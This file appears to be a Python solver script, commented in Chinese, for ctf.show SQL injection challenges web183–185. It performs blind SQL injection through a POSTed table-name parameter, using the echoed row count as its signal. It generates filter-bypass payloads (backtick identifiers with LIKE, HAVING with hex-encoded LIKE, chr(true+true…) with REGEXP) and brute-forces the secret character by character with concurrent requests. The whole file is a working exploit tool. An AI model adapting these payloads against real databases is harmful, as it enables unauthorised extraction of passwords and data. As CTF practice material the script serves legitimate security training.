"""ctf.show 「表名位置 count 盲注」解题器（web183 类题型）。

题型特征：
    页面没有 <form>，源码是 `select count(XX) from ".$_POST['tableName']."`
    —— 注入点在「表名」位置，回显只有 `$user_count = N;`，没有 SQL 报错 /
    回显位 / 常规布尔差异，AutoSQLi 的 oracle 体系套不上。

打法（web183 实测）：
    用反引号包住标识符，把空格换掉，拼出
        `ctfshow_user`where`pass`like"ctfshow{ab%"
    count 命中 = 1 即前缀正确，逐字符逼近 flag。

用法：
    python scripts/ctfshow_count_blind.py --url https://xxx.challenge.ctf.show/select-waf.php \
        --table ctfshow_user --column pass
    （--url 不带参数；脚本自己 POST tableName）
"""
from __future__ import annotations

import argparse
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

COUNT_RE = re.compile(r"user_count\s*=\s*(\d+)")
FLAG_RE = re.compile(r"ctfshow\{[^}\s]{1,120}\}")

_local = threading.local()


def _sess():
    """线程私有 Session：requests.Session 非线程安全，并发爆破要分开。"""
    s = getattr(_local, "s", None)
    if s is None:
        s = requests.Session()
        s.verify = False
        _local.s = s
    return s


def count_of(sess, url, param, payload, timeout=20):
    sess = sess or _sess()
    r = sess.post(url, data={param: payload}, timeout=timeout)
    if r.status_code != 200:
        return None
    m = COUNT_RE.search(r.text) or re.search(r"count\s*=\s*(\d+)", r.text)
    return int(m.group(1)) if m else None


def _num_expr(n: int) -> str:
    """把数字写成 true+true+...（web185 类：数字被过滤）。"""
    return "true" if n == 1 else "(" + "+".join(["true"] * n) + ")"


def make_payload(style: str, table: str, column: str, prefix: str) -> str:
    """把「前缀匹配」翻译成目标题型的注入串。

    - backtick（web183）：空格被滤，用反引号代替；引号可用，like 直接接字符串
    - having（web184）：引号/=被滤，用 group by ... having ... like 0x十六进制
    - chr_regexp（web185）：数字/引号/反引号全被滤，用 chr(true+true+..) 拼出
      字符串再 regexp()；代价是 payload 很长（4KB/8 字符）
    """
    if style == "backtick":
        return f"`{table}`where`{column}`like\"{prefix}%\""
    if style == "having":
        # like 0x.. 是二进制串比较：必须把 % 一起编码进去
        return f"{table} group by {column} having {column} like 0x{(prefix + '%').encode().hex()}"
    if style == "chr_regexp":
        parts = ",".join(f"chr({_num_expr(ord(ch))})" for ch in prefix)
        return f"{table} group by {column} having {column} regexp(concat({parts}))"
    raise SystemExit(f"未知 style: {style}")


def is_hit(style: str, count) -> bool:
    if count is None:
        return False
    return count != 0 if style == "having" else count == 1


def solve(url, param="tableName", table="ctfshow_user", column="pass",
          prefix="ctfshow{", charset="0123456789abcdef-{}", style="backtick",
          max_len=60, verbose=True):
    urllib3.disable_warnings()
    base = count_of(None, url, param, table)
    if base is None:
        raise SystemExit("拿不到 count 回显：确认入口 URL/参数名")
    if verbose:
        print(f"[*] 基线 {table} 行数 = {base}（style={style}）")

    flag = prefix
    while not flag.endswith("}") and len(flag) < max_len:
        # 同一前缀下各候选字符互不影响 → 并发探测，每个位置≈1 轮 RTT
        with ThreadPoolExecutor(max_workers=min(16, len(charset))) as ex:
            futs = {ex.submit(count_of, None, url, param,
                              make_payload(style, table, column, flag + ch),
                              20): ch for ch in charset}
            hit = None
            for fut in as_completed(futs):
                try:
                    n = fut.result()
                except Exception:      # noqa: BLE001
                    n = None
                if is_hit(style, n):
                    hit = futs[fut]
                    break
        if hit is None:
            break
        flag += hit
        if verbose:
            print(f"[+] {flag}", flush=True)
    return flag


def main(argv=None):
    for stream in (sys.stdout, sys.stderr):
        if hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8", errors="replace")
    ap = argparse.ArgumentParser(description="ctf.show count 盲注解题器")
    ap.add_argument("--url", required=True, help="select-waf.php 的完整 URL")
    ap.add_argument("--param", default="tableName")
    ap.add_argument("--table", default="ctfshow_user")
    ap.add_argument("--column", default="pass")
    ap.add_argument("--prefix", default="ctfshow{")
    ap.add_argument("--charset", default="0123456789abcdef-{}")
    ap.add_argument("--style", default="backtick",
                    choices=["backtick", "having", "chr_regexp"])
    ap.add_argument("--max-len", type=int, default=60)
    args = ap.parse_args(argv)
    flag = solve(args.url, args.param, args.table, args.column,
                 args.prefix, args.charset, args.style, args.max_len)
    m = FLAG_RE.search(flag)
    print("\nFLAG:", m.group(0) if m else flag)
    return 0 if m else 1


if __name__ == "__main__":
    sys.exit(main())
